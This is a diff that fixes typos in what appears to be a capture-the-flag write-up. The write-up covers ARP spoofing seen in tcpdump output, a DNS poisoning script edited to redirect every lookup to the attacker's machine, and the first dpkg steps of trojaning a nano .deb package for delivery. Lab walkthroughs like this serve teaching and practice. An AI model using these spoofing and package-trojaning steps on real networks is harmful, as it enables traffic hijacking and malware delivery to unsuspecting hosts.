@@ -23,7 +23,7 @@ IP address: 10.6.0.2
 MAC address: 02:42:0a:06:00:02
 
 ## ARP poisoning
-To start we run tcpdump to check what ip is sedning the ARP requests.
+To start we run tcpdump to check what ip is sending the ARP requests.
 ```
 guest@29847c69ad6a:~$ tcpdump -n 
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
@@ -70,11 +70,12 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 04:16:15.618236 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
 04:16:15.646731 IP 10.6.6.35.22953 > 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
 ```
-Now we modify the DNS poisoning script with the information we already know so it respond to all DNS requests giving our own machin IP and MAC addresses as destination.
+Now we modify the DNS poisoning script with the information we already know so it responds to all DNS requests giving our own machine IP and MAC addresses as destination.
 
 [DNS script](dns.py)
 ### Modified values for DNS poisoning
-```ipaddr_we_arp_spoofed = "10.6.6.53"
+```
+ipaddr_we_arp_spoofed = "10.6.6.53"
 def handle_dns_request(packet):
     # Need to change mac addresses, Ip Addresses, and ports below.
     # We also need
@@ -126,8 +127,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 The server receives requests for a debian package `/pub/jfrost/backdoor/suriv_amd64.deb`, so we can use that to deliver a malicious package and retrieve the flag.
 
-## Building malicious deb pakcage
-We reuse one fo teh packages already present on the machine to build our malicious payload.
+## Building malicious deb package
+We reuse one of the packages already present on the machine to build our malicious payload.
 ```
 cd debs
 dpkg -x nano_4.8-1ubuntu1_amd64.deb work
